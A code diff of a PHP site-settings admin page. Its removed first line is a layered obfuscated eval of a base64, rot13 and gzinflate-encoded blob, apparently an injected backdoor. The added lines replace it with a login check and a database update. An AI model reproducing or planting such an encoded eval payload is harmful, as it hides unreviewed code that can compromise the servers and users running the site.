@@ -1,8 +1,38 @@
 <?php 
 ob_start();
 session_start();
-eval(str_rot13(gzinflate(str_rot13(base64_decode('LUnHEoQ2Ev0al703GOLUnlVQzpnLFjnnzNdbrD3FlCQk1K1J93tiqYf7r60/4vUeyuWvZCgWHP3fvFnJvPyVD1qV3/8O/pTVASkSVjMF9o+P3YK/yjaG0Lv7bcUmWu1L23BI/R2yRVlImR6KImpKXFrlykLAd7Ls4qbqb9CVkD6+Vm8vsJEAUPmPj16sqey5jYw/OEQcN0pmCatSqb04WzFSXz/0+fOqHLckLlsl8JyS0HXcIS6O6UhBfqOs4xC1Q8IJ9hqfPNQSU8F4jVu73PQupbW+hqw62rA1jmKZ7Cp1yrN26kh1UhTrpWAdJVk8JqwNGjYa7H2jSc03dCfYGfDQR9CGHAJoL+ZVh/CSsxxooTqaLUfVcbcQGKVXw4kUJ1ipfBe3MWfx84krM2T03kw45BLmrJ4g0YOwMJGChuKYjCGmZJd+kTYh2ABC9WEUv7OXdEtydBAXfWwmNFi9RDdWwsqCqA9aLvxWM5MCl5Yuen4SjIf+ejhxjuTILI50cVR4K1yaWYLvIUVjfCTcuFbsaJtgauboceguiQ4p8f3UE3JaRBeJlDvcU0soKV6WYdMeFVtecrvpMoibrNY58rbb17kav0tcFyKG1sszopGN2xRMEfYv02tsjvMCc5qpUlD58qLewhBeAF6OSFwm3XPVSH3e9om3aNWU+ePlX14DHuauqSLaPDUEeHVyJY6aTtEnnNrNYHFMlF6+toDD6hiskmTGj93l2r972m90KZfHNi0R6sE0IkHVz/CwohPrzrjA2e39vZIpCbSA/qWd8APDE4XFALQtO6BVUj13b8+yBrfKVZGpEXNSz98wPq14YRcURM8i6sHDDZsDKojiSYNaA5QkUfIXT3eqevh4+MZwTykrsyJd2zvTFDK/NPaRaJkJOU/vvzk6QupDWfEpjpDgD/XAfnzS88BzOvPtNTRjdkx5DkeADciv2SJRVnFSorBxv9QIl4XXvIe5UvSQcebw0cK2/Fc6yuZ+iOKBdQhZg4cuosbEmO4rY/HiN3wDdq61SR5JeMKhOR3/fDIiSUcDXbUg+anbS/h3CUGQrhDBwvU3XVgf+4EiXvPtqeEwliyFRHUV3cCi624f0LjCTSH0DU9484MqMHpfbrgF1zZXpKJfwZvwbMOcaP6TsNDSVKrUiFWSnFEPera84btIuChbzbWMG77DGQitmdKCdqdrdP3IfM3CItzD+lWpgX4fnvDX9xb15fC9W7c/d6WM5+phNyMK/KaGZkZdgmWa7KlaPfJvWdRNyyNUtbgpVqc52b1/Fvao5DIqHx77R34aFmLeaDd4BTUI9sVSkxkqyNXAIP9ZDsdyApKdCc8qowoE405Ec+65plr8NqW7hqZxcXW2tpBIsA1rnApneae9R9/TfnxKHFNVwm49JT6YLXJLJeD67H1eyfJuEer9gytBx1XYLHrI4ZhegIb7dsS+0+A87LxWlYWJmqI9Jr9I/js0QhRFIt6OCE+NMyRfw1EYPLnch2l1dnuTGuc99bYc8WAqtj7ieReuFKHge3/sThnq0UEwPjODnh5J6WRDO7N/4Hi9oc+Sn9hM5Wk9BLQv0avmqul6VsztXeuHr6Lu/j8S3VZeru7dEWRtTKp6lscdrGJhmhYhCcvXGWyfv0JROpfhVbg1gXXi8e9u4Q7dv5UJ8E/aEacTwhtN4O6vz9FeykdPmWd8ANt8CuqXEQpYBraqnaauxzNbQcBn5fa4Th2bAFIA9XL2xb7fFuy0P++x/Ikmq2UrIUvGnq3KiN+Y47L0MA4crwqmNKuZxJn6MQ1hdKoPG0F3e1tJ+KGa7qFxDOLrdE3xCxiy38AWVRK+bvq6LI2AbxrLJF6eIPn627ilzRp/ZtrU92zebt3pWFo4wz7D2HUTk3WWqsA0QU04KI9RWTSao5qHDtSPyzGm65O5/OLpgPsJX6A7SZjtba1odmQMz/PhdJdeTfUO/4KWPNnSaHYeJIW4RRZ5TXOxY9XzyPYrpkGdlJA/1qwdmqVuqdgpE1VW9wc7NjJ7WIaKKhrqCFMKm0xWQ/nlCDOXpnMQpXzfICJP8E7oBNg2Nibk7Wxt+qnk0nZUfZi/JqeqScaHzzvEoB5uXG2CIepzc6mOqEwk46H3HnH1LPeM3ojxM0hfGJyEhzxUrFr6buLueZe/sCR/2/mJaSkrXLDU/+0qhxDUFyVLuXLD/gAvhzf2Wwt/LM2JcE+WEZP5CO5kFnWO3/Aw/LBzQzRq72Q0euGSD2aWkuCfDFXX7s1NqEU81uC1NH4Z+3g1ll2MduZJjFj5vd80baUj2GEfG2Qpy/cGrDrUDzTncPoQtJ4YhdV+QsSsxK1WuDiBJ3hy0c5lafx0Aq2i19y4NuHqKnKImDaoR0A8EttaPTooNIkHB8z4yJmYWBHJkN4+t+AAxzjhcIIGcnxqbOuVftGAvvzwtwctDCs6sWtlLMQixSTX3m1TegCauqhWst5lDRotUZoZ+77YEi1bQ4plCu/brUDXXhoqv9aeZiQ+pn4Sw5Z85h8WYA0K5MtNaFYmClLrt0e9xkvDk7phSebXy2kFlg8J4QNqRiFrwozdbjsMlJlaSznzO1jpToKBngzk4vV4u4Sbog4/iu0YMQ9Bgrli1BiGMX4buOc4Crow99OQal8Dw7s6NBxbDsEhKVNIij9ykLEF1zzepZE5tRA4mtgRXWAb2v2uHVO/R1tbtVT6UihaPnW+BGq0nUxgNyNJvfS6Njw4ky0x2gN0S6ukepzGqzRkai+EAAw/sjNA2oTXeExvr0Fg1kMnrhLlo6ymiGWoSyb/RWcrFYEahvR4iG9MzKABkNG4nYTvcnKWZ6Z8AD2VlZ1wT+WGVN71jORf8ltt+rvCrNcB8PqGgpS3j0oKSzP73IsGvFQx7+cpqR7vcCESx35i9uGIAebRyqA0t8liN5BBIR4JGGevMFZjbhdrmckPlMIVBrPO0jin9nUp3yYSM/02VGAAX445cpNDhevEbr01FsUhk6po3AA+2ZPU2ZgtsN+n9OVfyB45+xbjt6yTLyf1pdsm3028TbK2nmyhhQ7OEpahkyC7nNo373XSb0iw6PFM0X3ZioH+0UA1wkDP7NDdsNQqih2mPdnA/xBGxHhYy+hD4aFl07f1omCPWTV3/wwTbLRrtsmwzNgFQSj1k4hli5HqjMuWGpnNYLnuOgDNv3tCh5+pbF91aCfOYEraK4PqfezQpbtxOjw6pnT0E8qJgPoaF1y5Brb6ML6kgRvWDG60vG+dZyCVtZQBul50eR4S2JXPj8TbPYLFaiKMb+M6V8t9FO/b3rg0Ov0vZGTpnwqxRFWC+tvKTcYH5MFyUssfWwV1mls9z2oomBp2vxiWgVdN/uk/nk/rwFr92c0xHlbq6BnzOi9X2QltmWnSrbcbU/WUVW1YNLr0JO2pnYIzzyon0/B0Zd+UbJVP8HjGLEiLUXGRjuju/IAHytZypIoD9kleffXohisYrGoZP4F4Wm1O/khq0/pCJ8vfDsn8+R/w++/f')))));
+if($_SESSION['userid']=="")
+{
+	header("location:index.php");
+	exit();
+}
 
+include ("include/connection.php");
+
+if(isset($_POST['submit'])=='Save'){
+	$address=mysqli_real_escape_string($con,$_POST['address']);;
+	$email=mysqli_real_escape_string($con,$_POST['email']);;
+	$mobile=mysqli_real_escape_string($con,$_POST['mobile']);;
+
+	$content1=mysqli_real_escape_string($con,$_POST['content1']);
+	$content2=mysqli_real_escape_string($con,$_POST['content2']);
+	$content3=mysqli_real_escape_string($con,$_POST['content3']);
+	$content4=mysqli_real_escape_string($con,$_POST['content4']);
+	
+	$content5=mysqli_real_escape_string($con,$_POST['content5']);
+	$content6=mysqli_real_escape_string($con,$_POST['content6']);
+	$content7=mysqli_real_escape_string($con,$_POST['content7']);
+	$content8=mysqli_real_escape_string($con,$_POST['content8']);
+	$content9=mysqli_real_escape_string($con,$_POST['content9']);
+	
+$sql= "UPDATE `site_setting` SET `address` = '".$address."',`email` = '".$email."',`mobile` = '".$mobile."',`fblink` = '".$content1."',`twlink` = '".$content2."',`ln`='".$content3."',`insta`='".$content4."',`fbcount`='".$content5."',`twcount`='".$content6."',`youtubecount`='".$content7."',`instacount`='".$content8."' WHERE `id`= '1'";
+$query=mysqli_query($con,$sql);
+if($query){
+	
+	header("location:site_setting.php?msg=updt");
+	
+	}
+	}
 ?>
 <!DOCTYPE html>
 <html>
